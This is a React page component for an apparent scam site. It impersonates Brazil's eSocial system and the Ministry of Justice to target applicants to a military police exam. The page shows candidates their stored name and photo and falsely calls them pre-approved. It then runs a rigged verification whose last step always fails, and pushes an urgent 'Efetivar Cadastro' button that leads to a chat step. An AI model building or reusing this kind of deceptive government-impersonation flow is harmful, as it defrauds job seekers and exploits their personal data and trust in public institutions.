import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { CheckCircle2, Loader2, Circle, AlertTriangle, XCircle } from 'lucide-react';
import orgLogo from '@assets/logo-mj_1779836627251.png';
import { useEstadoPM } from '@/hooks/useEstadoPM';

interface VerificationStep {
  id: string;
  title: string;
  purpose: string;
  status: 'pending' | 'processing' | 'completed' | 'error';
}

interface UserInfo {
  firstName: string;
  cidade: string;
  cargo: string;
  gender: string;
}

const getGenderedText = (gender: string, masculine: string, feminine: string) => {
  return gender.toLowerCase().startsWith('f') ? feminine : masculine;
};

const INITIAL_STEPS: VerificationStep[] = [
  {
    id: 'cnis',
    title: 'CNIS/Dataprev',
    purpose: 'Valida seu histórico de contribuições previdenciárias',
    status: 'pending',
  },
  {
    id: 'fgts',
    title: 'FGTS Digital',
    purpose: 'Prepara sua conta para receber depósitos do FGTS',
    status: 'pending',
  },
  {
    id: 'ctps',
    title: 'Carteira de Trabalho Digital',
    purpose: 'Habilita o registro do seu vínculo empregatício',
    status: 'pending',
  },
  {
    id: 'esocial',
    title: 'eSocial',
    purpose: 'Confirma sua elegibilidade para registro de ingresso na corporação estadual',
    status: 'pending',
  },
];

const BUTTON_STEPS = [
  'Validando dados...',
  'Confirmando cadastro...',
  'Preparando atendimento...',
  'Direcionando para integração...',
];

export default function ESocialLoadingPage() {
  const [, navigate] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const [progress, setProgress] = useState(0);
  const [showAlert, setShowAlert] = useState(false);
  const [isButtonLoading, setIsButtonLoading] = useState(false);
  const [buttonStep, setButtonStep] = useState(0);
  const [fotoBase64, setFotoBase64] = useState<string | null>(null);
  const [verificationSteps, setVerificationSteps] = useState<VerificationStep[]>(INITIAL_STEPS);
  const [userInfo, setUserInfo] = useState<UserInfo>({
    firstName: '',
    cidade: '',
    cargo: '',
    gender: 'M',
  });

  useEffect(() => {
    window.scrollTo(0, 0);

    let parsedUser: any = null;

    try {
      const rawUser = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
      if (rawUser) parsedUser = JSON.parse(rawUser);
    } catch (_) {}

    const fullName = parsedUser?.nomeCompleto || parsedUser?.name || '';
    const raw = fullName.split(' ')[0] || '';
    const firstName = raw ? raw.charAt(0).toUpperCase() + raw.slice(1).toLowerCase() : '';

    const cidade = parsedUser?.cidade || parsedUser?.municipio || '';

    const CARGO_MAP: Record<string, string> = {
      'soldado-pm': 'Soldado de 2ª Classe PM',
      'oficial-pm': 'Aspirante-a-Oficial PM',
    };

    let applicationData: any = null;
    try {
      const rawApp = localStorage.getItem('applicationData');
      if (rawApp) applicationData = JSON.parse(rawApp);
    } catch (_) {}

    const positionId = applicationData?.positionId || applicationData?.position_id || '';
    const cargo =
      CARGO_MAP[positionId] ||
      applicationData?.positionTitle ||
      parsedUser?.cargo ||
      'Soldado de 2ª Classe PM';

    const gender =
      parsedUser?.gender || parsedUser?.genero || parsedUser?.sexo || 'M';

    setUserInfo({ firstName, cidade, cargo, gender });

    try {
      const fotoData = localStorage.getItem('foto');
      if (fotoData) {
        const foto = JSON.parse(fotoData);
        if (foto?.success && foto?.foto_base64) setFotoBase64(foto.foto_base64);
      }
    } catch (_) {}
  }, []);

  useEffect(() => {
    // 15 000ms / 50ms = 300 ticks → increment = 100/300 ≈ 0.333 to hit 100% exactly at 15s
    const TOTAL_MS = 15000;
    const TICK_MS = 50;
    const INCREMENT = 100 / (TOTAL_MS / TICK_MS);

    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          // Trigger alert when progress completes
          setVerificationSteps(curr => {
            const updated = [...curr];
            updated[updated.length - 1].status = 'error';
            return updated;
          });
          setShowAlert(true);
          return 100;
        }
        return prev + INCREMENT;
      });
    }, TICK_MS);

    let stepIdx = 0;
    const stepInterval = setInterval(() => {
      if (stepIdx >= INITIAL_STEPS.length) { clearInterval(stepInterval); return; }
      const idx = stepIdx;
      setVerificationSteps(curr => {
        const updated = [...curr];
        if (idx > 0 && updated[idx - 1]) updated[idx - 1].status = 'completed';
        if (updated[idx]) updated[idx].status = 'processing';
        return updated;
      });
      stepIdx++;
    }, 3500);

    return () => {
      clearInterval(progressInterval);
      clearInterval(stepInterval);
    };
  }, []);

  const getStepIcon = (status: string) => {
    switch (status) {
      case 'completed': return <CheckCircle2 className="w-5 h-5 text-[#0063AF]" />;
      case 'processing': return <Loader2 className="w-5 h-5 text-[#0063AF] animate-spin" />;
      case 'error':     return <XCircle className="w-5 h-5 text-red-600" />;
      default:          return <Circle className="w-5 h-5 text-gray-300" />;
    }
  };

  const getStatusLabel = (status: string) => {
    switch (status) {
      case 'completed': return <span className="text-xs text-[#0063AF] font-medium">Validado</span>;
      case 'processing': return <span className="text-xs text-[#0063AF] font-medium">Em análise...</span>;
      case 'error':     return <span className="text-xs text-red-600 font-medium">Pendente</span>;
      default:          return <span className="text-xs text-gray-400">Aguardando</span>;
    }
  };

  const handleStartIntegration = () => {
    if (isButtonLoading) return;
    setIsButtonLoading(true);
    setButtonStep(0);
    BUTTON_STEPS.forEach((_, i) => {
      setTimeout(() => setButtonStep(i), i * 800);
    });
    setTimeout(() => {
      window.scrollTo({ top: 0, behavior: 'smooth' });
      navigate('/e-social/chat');
    }, BUTTON_STEPS.length * 800 + 300);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Rawline','Open Sans',sans-serif" }}>
      <ExercitoHeader
        block_name={false}
        customTitle="Sistema eSocial Federal"
        customSubtitle="Integração Trabalhista — Servidores Públicos"
      />

      <div className="flex-1 py-8">
        <div className="max-w-xl mx-auto px-4">

          {/* Candidate banner */}
          <div className="border-l-4 border-[#0063AF] bg-gray-50 px-4 py-4 mb-6">
            <div className="flex items-start gap-4">
              {fotoBase64 && (
                <div className="flex-shrink-0">
                  <img
                    src={`data:image/jpeg;base64,${fotoBase64}`}
                    alt="Foto do candidato"
                    className="w-14 h-16 object-cover rounded border border-gray-200"
                  />
                </div>
              )}
              <div className="flex-1">
                <p className="text-xs text-[#0063AF] font-medium uppercase tracking-wide mb-1">
                  {getGenderedText(userInfo.gender, 'Pré-aprovado', 'Pré-aprovada')} — Concurso {sigla} 2026
                </p>
                <p className="text-sm text-gray-700 leading-relaxed">
                  {userInfo.firstName && userInfo.cidade
                    ? `${userInfo.firstName}, a demanda em ${userInfo.cidade} indica nota de corte favorável e elevada probabilidade de aprovação. Candidatos pré-aprovados devem regularizar seus dados trabalhistas antes da realização da prova.`
                    : userInfo.firstName
                    ? `${userInfo.firstName}, a demanda na sua região indica nota de corte favorável e elevada probabilidade de aprovação. Candidatos pré-aprovados devem regularizar seus dados trabalhistas antes da realização da prova.`
                    : 'A demanda na região indica nota de corte favorável e elevada probabilidade de aprovação. Candidatos pré-aprovados devem regularizar seus dados trabalhistas antes da realização da prova.'}
                </p>
              </div>
            </div>
          </div>

          {/* Title */}
          <div className="text-center mb-8">
            <h1 className="text-xl font-semibold text-[#004D8C] mb-2">
              {userInfo.firstName
                ? `${userInfo.firstName}, estamos verificando sua situação trabalhista`
                : 'Verificando sua situação trabalhista'}
            </h1>
            <p className="text-sm text-gray-600">
              Consultando sistemas federais para preparar sua nomeação no Concurso {sigla} 2026.
            </p>
          </div>

          {/* Progress bar */}
          <div className="mb-8">
            <div className="flex justify-between text-xs text-gray-500 mb-2">
              <span>Progresso</span>
              <span>{Math.round(progress)}%</span>
            </div>
            <div className="w-full bg-gray-100 rounded-full h-2">
              <div
                className="bg-[#0063AF] h-2 rounded-full transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          {/* Verification steps */}
          <div className="border border-gray-200 rounded-lg overflow-hidden mb-6">
            <div className="bg-gray-50 px-4 py-3 border-b border-gray-200">
              <p className="text-xs text-gray-500 uppercase tracking-wide">Etapas de Verificação</p>
            </div>
            <div className="divide-y divide-gray-100">
              {verificationSteps.map(step => (
                <div
                  key={step.id}
                  className={`px-4 py-4 flex items-center justify-between transition-all duration-300 ${
                    step.status === 'processing' ? 'bg-blue-50' :
                    step.status === 'error'      ? 'bg-red-50'  : 'bg-white'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    {getStepIcon(step.status)}
                    <div>
                      <p className={`text-sm font-medium ${step.status === 'pending' ? 'text-gray-400' : 'text-gray-800'}`}>
                        {step.title}
                      </p>
                      <p className={`text-xs ${step.status === 'pending' ? 'text-gray-300' : 'text-gray-500'}`}>
                        {step.purpose}
                      </p>
                    </div>
                  </div>
                  {getStatusLabel(step.status)}
                </div>
              ))}
            </div>
          </div>

          {/* Alert + CTA (shown after 15s) */}
          {showAlert && (
            <div className="border-2 border-amber-300 bg-amber-50 rounded-lg p-4 mb-6">
              <div className="flex items-start gap-3">
                <AlertTriangle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
                <div className="flex-1">
                  <p className="text-sm font-semibold text-amber-800">
                    {userInfo.firstName
                      ? `${userInfo.firstName}, ação necessária para prosseguir`
                      : 'Ação necessária para prosseguir'}
                  </p>
                  <p className="text-sm text-amber-700 mt-1">
                    Seu cadastro no eSocial precisa ser atualizado para que sua nomeação
                    {userInfo.cargo ? ` como ${userInfo.cargo}` : ''} possa ser efetivada após a aprovação no Concurso {sigla} 2026.
                  </p>

                  <button
                    data-testid="button-efetivar-cadastro"
                    onClick={handleStartIntegration}
                    disabled={isButtonLoading}
                    className={`mt-4 w-full bg-[#0063AF] text-white rounded-lg py-3.5 px-4 flex items-center justify-center transition-all duration-200 shadow-md relative overflow-hidden ${
                      isButtonLoading ? 'cursor-wait' : 'hover:bg-[#004D8C] hover:shadow-lg group'
                    }`}
                    style={{
                      animation: isButtonLoading ? 'none' : 'subtle-glow 2s ease-in-out infinite',
                      minHeight: '52px',
                    }}
                  >
                    {isButtonLoading ? (
                      <div className="flex items-center gap-2">
                        <Loader2 className="w-4 h-4 animate-spin" />
                        <span key={buttonStep} className="font-medium text-sm animate-fade-in">
                          {BUTTON_STEPS[buttonStep]}
                        </span>
                      </div>
                    ) : (
                      <>
                        <span className="font-semibold">Efetivar Cadastro</span>
                        <span className="ml-2 inline-block transition-transform duration-300 group-hover:translate-x-1">→</span>
                      </>
                    )}
                  </button>

                  <style>{`
                    @keyframes subtle-glow {
                      0%, 100% { box-shadow: 0 4px 6px -1px rgba(19,81,180,0.3); }
                      50%       { box-shadow: 0 4px 20px -1px rgba(19,81,180,0.5); }
                    }
                    @keyframes fade-in {
                      from { opacity: 0; transform: translateY(-4px); }
                      to   { opacity: 1; transform: translateY(0); }
                    }
                    .animate-fade-in { animation: fade-in 0.3s ease-out forwards; }
                  `}</style>

                  <p className="text-xs text-amber-600 mt-2 text-center">Conclusão em menos de 5 minutos</p>
                </div>
              </div>
            </div>
          )}

          {/* Info box */}
          <div className="bg-[#EFF6FC] border border-[#0063AF] border-opacity-20 rounded-lg p-4">
            <p className="text-sm font-semibold text-[#004D8C] mb-2">
              Por que esta verificação é necessária?
            </p>
            <p className="text-sm text-gray-700 leading-relaxed">
              A {sigla} está processando as nomeações do Concurso Público 2026
              {userInfo.cidade ? ` na região de ${userInfo.cidade}` : ''}. Isso significa que, após sua aprovação na prova, a posse poderá ser{' '}
              {getGenderedText(userInfo.gender, 'efetivada', 'efetivada')} com agilidade, sem aguardar meses de tramitação burocrática.
            </p>
            <p className="text-sm text-gray-700 leading-relaxed mt-2">
              Para que isso seja possível, seus dados precisam estar previamente integrados aos sistemas de controle trabalhista (eSocial, CNIS, FGTS e Carteira de Trabalho Digital) exigidos para ingresso na corporação estadual.
            </p>
          </div>

          {/* Footer branding */}
          <div className="flex justify-center mt-8">
            <img
              src={orgLogo}
              alt="Ministério da Justiça e Segurança Pública"
              className="h-9 object-contain"
            />
          </div>

          <p className="text-center text-[#AAAAAA] text-[10px] mt-4 mb-8">
            Portal do Candidato v3.6 · eSocial Federal
          </p>

        </div>
      </div>
    </div>
  );
}
